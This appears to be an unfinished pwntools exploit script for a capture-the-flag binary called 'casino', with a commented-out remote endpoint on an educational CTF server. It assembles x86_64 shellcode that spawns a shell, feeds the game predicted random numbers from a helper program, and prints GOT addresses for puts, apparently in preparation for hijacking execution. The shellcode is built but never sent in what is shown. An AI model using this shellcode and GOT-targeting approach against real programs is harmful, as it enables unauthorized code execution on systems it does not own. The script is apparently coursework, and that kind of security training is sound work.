from pwn import *

# shellcode
context.clear(arch='x86_64')
sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
sc = asm(shellcraft.sh())
name_all = b'A' * 0x10 + sc

# random number
p = process("./gen_num.out")
numbers = p.recvall().decode().split('\n') # prevent bytes object is required not str error
del numbers[-1]
p.close()


# send
r = process("./casino")
elf = ELF("./casino")
print(elf.got)
print(elf.got['puts'])
# r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', 'AAAAAAAAAAAAAA') # 15 is the limit, no overflow for this
r.sendlineafter('age: ', '40')

for cnt_try in range(0, 2):
    cnt_num = 0
    for i in numbers:
        r_out = 'Chose the number ' + str(cnt_num) + ': '
        r.recvuntil(r_out)
        r.sendline(i)
        print('sendnumber ', i)
        cnt_num += 1

    r.recvuntil(':no]: ')
    r.sendline('0')
    print(r.recvline())

#r.interactive()
r.close()
